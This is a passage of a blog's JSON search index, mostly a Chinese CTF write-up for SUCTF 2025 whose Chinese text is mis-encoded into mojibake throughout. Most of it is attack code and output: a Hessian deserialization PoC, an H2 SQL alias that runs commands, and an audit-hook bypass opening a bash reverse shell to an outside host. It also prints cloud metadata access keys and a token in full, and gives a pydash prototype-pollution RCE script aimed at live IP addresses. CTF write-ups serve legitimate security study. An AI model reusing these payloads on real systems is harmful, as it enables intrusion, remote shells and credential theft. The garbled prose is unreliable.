jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" Z3n1th z3âœŒï¸ ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSycloverä¸»åŠ›æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€å¶ç„¶ä¹Ÿä¼šå­¦ç‚¹äº‘å®‰å…¨,ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"}]